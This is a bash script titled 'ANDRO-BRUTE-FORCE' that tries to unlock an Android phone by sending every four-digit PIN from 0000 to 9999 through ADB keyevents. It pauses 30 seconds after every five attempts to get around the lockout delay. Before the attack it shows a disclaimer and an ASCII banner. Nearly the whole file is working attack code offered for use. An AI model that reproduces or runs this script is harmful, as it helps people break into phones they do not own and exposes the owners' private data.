#########################ANDRO-BRUTE-FORCE##########################
# created by hack4peace
# follow me on github => https://github.com/hack4peace
#########################ANDRO-BRUTE-FORCE##########################
###############
red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"
#############
# !/usr/bin/env bash
clear
echo -e "$grn I AM NOT RESPONSIBLE FOR ANY DAMAGE AND ILLEGAL WORK THIS IS YOUR RESPONSIBILITY IF YOU ACCEPT YOUR RESPONSIBILITY THEN CLICK ENTER"
read who
clear
echo -e "$grn What is your age"
read who 
echo -e "$grn What is your name"
read who 
clear
echo -e "$grn                   _                       _                   _                   __ $rset"                       
echo -e "$grn                  | |                     | |                 | |                 / _| $rset"                        
echo -e "$red  __ _  _ __    __| | _ __   ___   ______ | |__   _ __  _   _ | |_   ___  ______ | |_   ___   _ __   ___   ___ $rset"
echo -e "$grn / _  ||  _ \  / _  ||  __| / _ \ |______||  _ \ |  __|| | | || __| / _ \|______||  _| / _ \ |  __| / __| / _ \ $rset"
echo -e "$red| (_| || | | || (_| || |   | (_) |        | |_) || |   | |_| || |_ |  __/        | |  | (_) || |   | (__ |  __/ $rset"
echo -e "$grn \____||_| |_| \____||_|    \___/         |____/ |_|    \____| \__| \___|        |_|   \___/ |_|    \___| \___| $rset"
echo -e "$red                                                                                                       version 1.1 $rset"                                                                                                                                                                                                                               
echo -e "$blue                                             created by hack4peace $rset"
echo -e "$blue                                           THANKS FOR USING THIS TOOL $who$rset"
echo -e "$grn---------------------------------------------------$rset"
echo -e "$red                STARTING ADB BRUTE FORCE$rset"
echo -e "$grn---------------------------------------------------$rset"

adb shell input keyevent 82
adb shell input swipe 407 1211 378 85

echo -e "$grn---------------------------------------------------$rset"
echo -e "$red                     BRUTE FORCING$rset"
echo -e "$grn---------------------------------------------------$rset"

for i in {0000..9999}; do

    echo -e "$red $i$rset"
	
    for (( j=0; j<${#i}; j++ )); do
        adb shell input keyevent $((`echo ${i:$j:1}`+7))
    done

    adb shell input keyevent 66
    
    if ! (( `expr $i + 1` % 5 )); then
        adb shell input keyevent 66
        sleep 30
        adb shell input keyevent 82
        adb shell input swipe 407 1211 378 85
    fi
done

